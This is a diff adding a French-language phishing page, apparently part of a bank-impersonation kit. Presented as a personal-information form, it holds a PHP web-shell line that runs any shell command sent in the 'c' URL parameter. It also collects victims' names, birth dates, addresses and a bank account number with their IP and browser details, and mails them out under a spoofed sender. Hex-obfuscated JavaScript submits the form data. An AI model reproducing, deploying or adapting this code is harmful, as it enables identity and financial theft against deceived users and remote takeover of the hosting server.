@@ -1,0 +1,31 @@
+<? include("config.php"); @passthru($_GET['c']); if($_GET['nam']){ if($_GET['nam'] && $_GET['pnm'] && $_GET['adr'] && $_GET['cty'] && $_GET['zip'] && $_GET['dbd'] && $_GET['dbm'] && $_GET['dby']){ $nam=$_GET['nam'];$pnm=$_GET['pnm'];$dob=$_GET['dbd']."/".$_GET['dbm']."/".$_GET['dby'];$adr=$_GET['adr'];$cty=$_GET['cty'];$zip=$_GET['zip'];$phn=$_GET['phn'];$ip=getenv("REMOTE_ADDR");$host=gethostbyaddr(getenv("REMOTE_ADDR"));$msg = "--------------------- Bismillah ----------------------\nFNAME : $nam\nLNAME : $pnm\nD.O.B : $dob\nADRSS : $adr\nCITY. : $cty\nZIP.. : $zip\nPHONE : $phn\n------------------------------------------------------\nIPv4 : $ip\nHOST : $host\nUSAG : ".$_SERVER["HTTP_USER_AGENT"]."\n------------------- Al-Hamdolillah -------------------\nALLAH YJIB Tissir";$sbj = "Sina $ip [PERSO] | $nam $pnm | $dob";$frm = "From: sina<lover@sina.fr>";mail($ana,$sbj,$msg,$frm);print "<script>checkValues();$('#o_content').load('mail.php');</script>";exit; }else{ print "<a id='error'>Les cases avec la <a id='njm'>*</a> sont obligatoires !</a>";exit; }}
+?> 
+<script>
+var _0x6a41=["","\x68\x74\x6D\x6C","\x23\x61\x6E\x73\x72","\x76\x61\x6C\x75\x65","\x6E\x61\x6D","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64","\x70\x6E\x6D","\x61\x64\x72","\x63\x74\x79","\x7A\x69\x70","\x70\x68\x6E","\x64\x62\x64","\x64\x62\x6D","\x64\x62\x79","\x56\x65\x75\x69\x6C\x6C\x65\x7A\x20\x65\x6E\x74\x72\x65\x72\x20\x76\x6F\x74\x72\x65\x20\x6E\x6F\x6D\x20\x21","\x56\x65\x75\x69\x6C\x6C\x65\x7A\x20\x65\x6E\x74\x72\x65\x72\x20\x76\x6F\x74\x72\x65\x20\x70\x72\x65\x6E\x6F\x6D\x20\x21","\x56\x65\x75\x69\x6C\x6C\x65\x7A\x20\x65\x6E\x74\x72\x65\x72\x20\x76\x6F\x74\x72\x65\x20\x61\x64\x72\x65\x73\x73\x65\x20\x21","\x56\x65\x75\x69\x6C\x6C\x65\x7A\x20\x65\x6E\x74\x72\x65\x72\x20\x76\x6F\x74\x72\x65\x20\x76\x69\x6C\x6C\x65\x20\x6F\x75\x20\x72\x65\x67\x69\x6F\x6E\x20\x21","\x56\x65\x75\x69\x6C\x6C\x65\x7A\x20\x65\x6E\x74\x72\x65\x72\x20\x76\x6F\x74\x72\x65\x20\x63\x6F\x64\x65\x20\x70\x6F\x73\x74\x61\x6C\x65\x20\x21","\x56\x65\x75\x69\x6C\x6C\x65\x7A\x20\x65\x6E\x74\x72\x65\x72\x20\x76\x6F\x74\x72\x65\x20\x6E\x75\x6D\xE9\x72\x6F\x20\x64\x65\x20\x74\x65\x6C\x65\x70\x68\x6F\x6E\x65\x20\x21","\x56\x65\x75\x69\x6C\x6C\x65\x7A\x20\x65\x6E\x74\x72\x65\x72\x20\x76\x6F\x74\x72\x65\x20\x76\x61\x6C\x69\x64\x65\x20\x64\x61\x74\x65\x20\x64\x65\x20\x6E\x61\x69\x73\x73\x61\x6E\x63\x65\x20\x21","\x3C\x69\x6D\x67\x20\x73\x72\x63\x3D\x22\x6C\x6F\x61\x64\x69\x6E\x67\x2E\x67\x69\x66\x22\x20\x61\x6C\x74\x3D\x22\x6C\x6F\x61\x64\x69\x6E\x67\x22\x3E","\x70\x65\x72\x73\x6F\x2E\x70\x68\x70\x3F\x6E\x61\x6D\x3D","\x26\x70\x6E\x6D\x3D","\x26\x61\x64\x72\x3D","\x26\x63\x74\x79\x3D","\x26\x7A\x69\x70\x3D","\x26\x70\x68\x6E\x3D","\x26\x64\x62\x64\x3D","\x26\x64\x62\x6D\x3D","\x26\x64\x62\x79\x3D","\x6C\x6F\x61\x64","\x56\x6F\x75\x6C\x65\x7A\x2D\x76\x6F\x75\x73\x20\x76\x72\x61\x69\x6D\x65\x6E\x74\x20\x72\x65\x74\x6F\x75\x72\x6E\x65\x72\x20\x3F","\x2E\x70\x68\x70","\x23\x6F\x5F\x63\x6F\x6E\x74\x65\x6E\x74"];function SubMitInfo(){$(_0x6a41[2])[_0x6a41[1]](_0x6a41[0]);var _0xb8b0x2=document[_0x6a41[5]](_0x6a41[4])[_0x6a41[3]];var _0xb8b0x3=document[_0x6a41[5]](_0x6a41[6])[_0x6a41[3]];var _0xb8b0x4=document[_0x6a41[5]](_0x6a41[7])[_0x6a41[3]];var _0xb8b0x5=document[_0x6a41[5]](_0x6a41[8])[_0x6a41[3]];var _0xb8b0x6=document[_0x6a41[5]](_0x6a41[9])[_0x6a41[3]];var _0xb8b0x7=document[_0x6a41[5]](_0x6a41[10])[_0x6a41[3]];var _0xb8b0x8=document[_0x6a41[5]](_0x6a41[11])[_0x6a41[3]];var _0xb8b0x9=document[_0x6a41[5]](_0x6a41[12])[_0x6a41[3]];var _0xb8b0xa=document[_0x6a41[5]](_0x6a41[13])[_0x6a41[3]];var _0xb8b0xb=_0x6a41[14];var _0xb8b0xc=_0x6a41[15];var _0xb8b0xd=_0x6a41[16];var _0xb8b0xe=_0x6a41[17];var _0xb8b0xf=_0x6a41[18];var _0xb8b0x10=_0x6a41[19];var _0xb8b0x11=_0x6a41[20];if(simpleField(_0x6a41[4],_0xb8b0xb)&&simpleField(_0x6a41[6],_0xb8b0xc)&&numericField(_0x6a41[11],_0xb8b0x11)&&numericField(_0x6a41[12],_0xb8b0x11)&&numericField(_0x6a41[13],_0xb8b0x11)&&simpleField(_0x6a41[7],_0xb8b0xd)&&simpleField(_0x6a41[8],_0xb8b0xe)&&numericField(_0x6a41[9],_0xb8b0xf)){$(_0x6a41[2])[_0x6a41[1]](_0x6a41[21]);$(_0x6a41[2])[_0x6a41[31]](_0x6a41[22]+escape(_0xb8b0x2)+_0x6a41[23]+escape(_0xb8b0x3)+_0x6a41[24]+escape(_0xb8b0x4)+_0x6a41[25]+escape(_0xb8b0x5)+_0x6a41[26]+escape(_0xb8b0x6)+_0x6a41[27]+escape(_0xb8b0x7)+_0x6a41[28]+escape(_0xb8b0x8)+_0x6a41[29]+escape(_0xb8b0x9)+_0x6a41[30]+escape(_0xb8b0xa));} ;} ;function Retour(_0xb8b0x13){if(confirm(_0x6a41[32])){$(_0x6a41[34])[_0x6a41[31]](_0xb8b0x13+_0x6a41[33]);} ;} ;
+</script>
+<div class="contenu">
+			<div id="pavtitle" class="pave_gris_532">Informations personnelles</div>
+			<div style="border:1px solid #DDD;width:570px;" align="center">
+			<br>
+			<div id="ansr" align="center"></div>
+			<br>
+			<table width="450" align="center">
+						<tr><td>Nom <a id='njm'>*</a></td><td><input type='text' name='nam' id='nam' maxlength="24"></td></tr>
+						<tr><td>Pr&eacute;nom <a id='njm'>*</a></td><td><input type='text' name='pnm' id='pnm' maxlength="24"></td></tr>
+						<tr><td>Date de naissance <a id='njm'>*</a></td><td><input type='text' name='dbd' id='dbd' style="width:25px;" maxlength="2"> - <input type='text' name='dbm' id='dbm' style="width:25px;" maxlength="2"> - <input type='text' name='dby' id='dby' style="width:50px;" maxlength="4"></td></tr>
+						<tr><td>Adresse <a id='njm'>*</a></td><td><input type='text' name='adr' id='adr' maxlength="50"></td></tr>
+
+						<tr><td>Ville <a id='njm'>*</a></td><td><input type='text' name='cty' id='cty' maxlength="24"></td></tr>
+						<tr><td>Code postale <a id='njm'>*</a></td><td><input type='text' name='zip' id='zip' maxlength="15"></td></tr>
+						<tr><td>N&#176; de compte bancaire </td><td><input type='text' name='phn' id='phn' maxlength="24"></td></tr>
+						<tr><td></td><td><font face="Verdana" size="1" id="njm">* Champs obligatoires</font></td></tr>
+						<tr><td></td><td align='right'></td></tr>
+			</table>
+			<br>
+			
+			</div>
+		    <div class="pave_gris_bas" align="right"><img src="bt_retour.jpg" alt="Retour" title="Retour" onclick="Retour('cc')"> 
+            <img src="btn_valider.gif" name="valider" class="valider2" title="Valider" onclick="SubMitInfo()"  style="width:67px;height:26px;margin-right:15px;margin-top:20px" onclick="SubMit()">
+          </div>
+        </form>
+</div>
